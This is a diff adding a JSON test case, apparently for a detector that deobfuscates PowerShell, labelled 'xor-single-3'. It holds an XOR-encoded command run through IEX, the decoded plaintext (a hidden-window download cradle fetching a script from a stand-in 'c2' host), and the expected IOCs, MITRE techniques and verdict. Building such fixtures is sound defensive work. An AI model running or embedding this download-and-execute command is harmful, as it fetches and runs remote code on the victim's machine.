@@ -1,0 +1,41 @@
+{
+  "id": "xor-single-3",
+  "category": "ps-crypto",
+  "algorithm": "XOR-single",
+  "command_line": "$h='5a455d4f5859424f46460a075d0a42434e4e4f440a636f720a02644f5d076548404f495e0a644f5e047d4f486946434f445e03046e455d4446454b4e795e5843444d020d425e5e5a10050549180552045a591b0d03'; $b = -split ($h -replace '..','& ') | %{[Convert]::ToByte($_,16)}; $dec = -join($b | %{ [char]($_ -bxor 0x2a) }); IEX $dec",
+  "stage_ladder": [
+    {
+      "name": "hex-decode",
+      "recoverable": true,
+      "reason": ""
+    },
+    {
+      "name": "xor-single-decrypt",
+      "recoverable": true,
+      "reason": ""
+    },
+    {
+      "name": "utf8-decode",
+      "recoverable": true,
+      "reason": ""
+    }
+  ],
+  "key_status": "inline-static",
+  "expected_plaintext": "powershell -w hidden IEX (New-Object Net.WebClient).DownloadString('http://c2/x.ps1')",
+  "expected_iocs": [
+    "powershell -w hidden IEX (New-Object Net.WebClient).DownloadString('http://c2/x.ps1')"
+  ],
+  "expected_lolbins": [
+    "powershell.exe"
+  ],
+  "expected_mitre": [
+    "T1027",
+    "T1059.001",
+    "T1140"
+  ],
+  "expected_verdict": "malicious",
+  "expected_confidence_min": 0.8,
+  "notes": "",
+  "source": "nivxray-rc41-crypto",
+  "license": "CC-BY-4.0"
+}
